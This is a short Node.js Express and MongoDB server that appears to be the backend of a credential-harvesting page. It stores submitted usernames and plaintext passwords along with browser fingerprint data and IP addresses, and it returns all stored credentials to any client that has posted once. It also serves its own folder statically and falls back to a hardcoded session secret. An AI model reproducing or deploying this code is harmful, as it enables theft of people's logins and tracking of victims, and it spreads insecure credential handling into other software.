
const express = require('express');
const path = require('path');
const mongoose = require('mongoose');
const session = require('express-session');

const app = express();

// Connect to MongoDB using environment variable
mongoose.connect(process.env.MONGODB_URL)
  .then(() => console.log('Connected to MongoDB'))
  .catch(err => console.error('MongoDB connection error:', err));

// User schema
const UserSchema = new mongoose.Schema({
  username: String,
  password: String,
  userAgent: String,
  language: String,
  platform: String,
  screenResolution: String,
  timeZone: String,
  timestamp: Date,
  referrer: String,
  cookiesEnabled: Boolean,
  ipAddress: String,
  createdAt: { type: Date, default: Date.now }
});

const User = mongoose.model('User', UserSchema);

app.use(express.json());
app.use(express.urlencoded({ extended: true }));
app.use(express.static('.'));
app.use(session({
  secret: process.env.SESSION_SECRET || 'default_secret',
  resave: false,
  saveUninitialized: false
}));

app.get('/', (req, res) => {
  res.sendFile(path.join(__dirname, 'index.html'));
});

app.get('/admin', (req, res) => {
  res.sendFile(path.join(__dirname, 'admin.html'));
});

app.post('/admin/credentials', async (req, res) => {
  try {
    const userData = req.body;
    userData.ipAddress = req.ip;
    const user = new User(userData);
    await user.save();
    req.session.userId = user._id;
    res.status(200).json({ message: 'Credentials stored' });
  } catch (error) {
    res.status(500).json({ error: 'Failed to store credentials' });
  }
});

app.get('/admin/credentials', async (req, res) => {
  if (!req.session.userId) {
    return res.status(401).json({ error: 'Unauthorized' });
  }
  try {
    const credentials = await User.find();
    res.json(credentials);
  } catch (error) {
    res.status(500).json({ error: 'Failed to fetch credentials' });
  }
});

app.listen(5000, '0.0.0.0', () => {
  console.log('Server running on port 5000');
});
